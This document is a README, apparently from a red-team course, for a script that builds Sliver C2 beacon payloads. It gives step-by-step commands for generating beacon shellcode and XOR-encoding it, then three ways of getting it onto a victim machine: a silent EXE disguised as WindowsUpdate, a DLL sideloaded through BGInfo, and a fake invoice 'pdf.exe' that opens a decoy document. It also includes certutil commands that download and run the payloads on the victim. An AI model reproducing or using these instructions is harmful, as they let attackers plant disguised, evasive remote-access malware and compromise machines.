# 02.1 - Orsumaal: Automated Payload Generator

**Developed by Vamsi Krishna Orsu**

`orsumaal.py` automates everything from Module 02 that happens after you generate your Sliver beacon. Instead of manually writing Nim files, running XOR encoders, compiling with the right flags, generating icons, and setting up decoy PDFs — run one script, answer a few questions, and get a ready-to-deploy payload.

---

## Prerequisites

Before running the script, you need one thing ready on Kali:

### Generate the Sliver Beacon Shellcode

```bash
sudo systemctl start sliver
sliver
```

```
sliver > https --lhost 192.168.10.10 --lport 443
sliver > generate beacon --http https://192.168.10.10:443 --os windows --arch amd64 --format shellcode --shellcode-encoder none --skip-symbols --seconds 30 --jitter 10 --save /tmp/beacon.bin
```

Wait 30-90 seconds. Verify:

```bash
ls -la /tmp/beacon.bin
```

### Copy the Script to Kali

```bash
scp tools/orsumaal.py kali@192.168.10.10:/tmp/orsumaal.py
```

## Attack Types

### Attack 1: Standalone EXE

Generates a Windows GUI EXE with your chosen icon. Compiled as `--app:gui` so:
- No console window flashes when the victim runs it
- CMD prompt returns immediately — the terminal does not freeze
- Process runs silently in the background

```
? Output EXE name (no extension): WindowsUpdate
→ Output: /tmp/WindowsUpdate.exe
```

Files served from HTTP server:
```
/tmp/beacon_encoded.bin
/tmp/WindowsUpdate.exe
```

On victim:
```cmd
certutil.exe -urlcache -split -f http://192.168.10.10:8888/WindowsUpdate.exe C:\Windows\Temp\WindowsUpdate.exe
C:\Windows\Temp\WindowsUpdate.exe
```

CMD returns immediately. Beacon appears in Sliver within 30-40 seconds.

---

### Attack 2: DLL Sideload

Generates a `version.dll` proxy. The output filename is locked to `version.dll` — BGInfo64.exe looks for that name specifically, so it cannot be changed.

```
[!] DLL sideload requires the output to be named exactly version.dll
→ Output: /tmp/version.dll
```

Files served from HTTP server:
```
/tmp/beacon_encoded.bin
/tmp/version.dll
```

On victim:
```cmd
:: Setup BGInfo
Invoke-WebRequest -Uri "https://download.sysinternals.com/files/BGInfo.zip" -OutFile "$env:TEMP\BGInfo.zip"
Expand-Archive -Path "$env:TEMP\BGInfo.zip" -DestinationPath "C:\Windows\Temp\bginfo\"

:: Download malicious DLL
certutil.exe -urlcache -split -f http://192.168.10.10:8888/version.dll C:\Windows\Temp\bginfo\version.dll

:: Copy real version.dll and rename
copy C:\Windows\System32\version.dll C:\Windows\Temp\bginfo\version_real.dll

:: Run BGInfo (loads your DLL automatically)
C:\Windows\Temp\bginfo\Bginfo64.exe /timer:0 /nolicprompt
```

---

### Attack 3: Fake PDF EXE

Generates a GUI EXE that looks like a PDF. When double-clicked:
1. Opens your real PDF as a decoy (so the victim sees a document)
2. Fires the Sliver beacon in the background

The output filename uses the `.pdf.exe` trick — Windows hides extensions by default, so `Invoice-June2026.pdf.exe` shows as `Invoice-June2026.pdf` in Explorer.

```
? Output EXE name (no extension): Invoice-June2026
? Path to decoy PDF: ~/Desktop/vamsi.pdf

→ Output EXE:   /tmp/Invoice-June2026.pdf.exe
→ Decoy served: /tmp/Invoice-June2026-decoy.pdf
→ PDF dropped to victim %TEMP% as: Invoice-June2026.pdf
```

On victim:
```cmd
certutil.exe -urlcache -split -f "http://192.168.10.10:8888/Invoice-June2026.pdf.exe" "C:\Windows\Temp\Invoice-June2026.pdf.exe"
C:\Windows\Temp\Invoice-June2026.pdf.exe
```

The decoy PDF opens. The beacon fires. The user never sees anything suspicious.

## Filename Rules

The script validates filenames before building. Allowed characters:

| Allowed | Not Allowed |
|---------|-------------|
| Letters (`a-z`, `A-Z`) | Spaces |
| Digits (`0-9`) | Dots (`.`) |
| Hyphens (`-`) | Special chars (`@`, `!`, `$`, etc.) |
| Underscores (`_`) | |

Examples of valid names: `WindowsUpdate`, `bill-june-2026`, `setup_v2`, `InvoiceQ1`

The script warns you and asks again if the name is invalid. It also strips the extension if you accidentally type it (e.g. `loader.exe` → `loader`).

## After Generation

The script prints exact commands at the end. General flow:

**Terminal 1** — Sliver (already running)

**Terminal 2** — Start HTTP server:
```bash
cd /tmp && python3 -m http.server 8888
```

**Terminal 3** — On the victim, run the commands printed by the script.

**Terminal 1 again** — Watch for the beacon:
```
sliver > beacons
```

## What the Script Does Internally

| Step | What Happens |
|------|-------------|
| Preflight | Checks that `beacon.bin`, `nim`, `mingw`, ImageMagick, and `windres` exist before doing anything |
| XOR encode | Reads `/tmp/beacon.bin`, XOR-encodes every byte with your key, writes `/tmp/beacon_encoded.bin` |
| Icon | ImageMagick generates a 256px PNG, converts to multi-size ICO, `windres` compiles it to a `.res` file |
| Write Nim source | Generates the `.nim` file with your IP, port, and XOR key injected |
| Compile | Runs `nim c -d:mingw -d:release --app:gui ...` with the correct flags per attack type |
| PDF setup | Copies your decoy PDF to `/tmp/`, renames it to match the output EXE name |

## What the Script Does NOT Do

- Start Sliver or the HTTPS listener
- Generate `beacon.bin`
- Start the HTTP server (prints the command, you run it)
- Transfer files to the victim (prints the command)
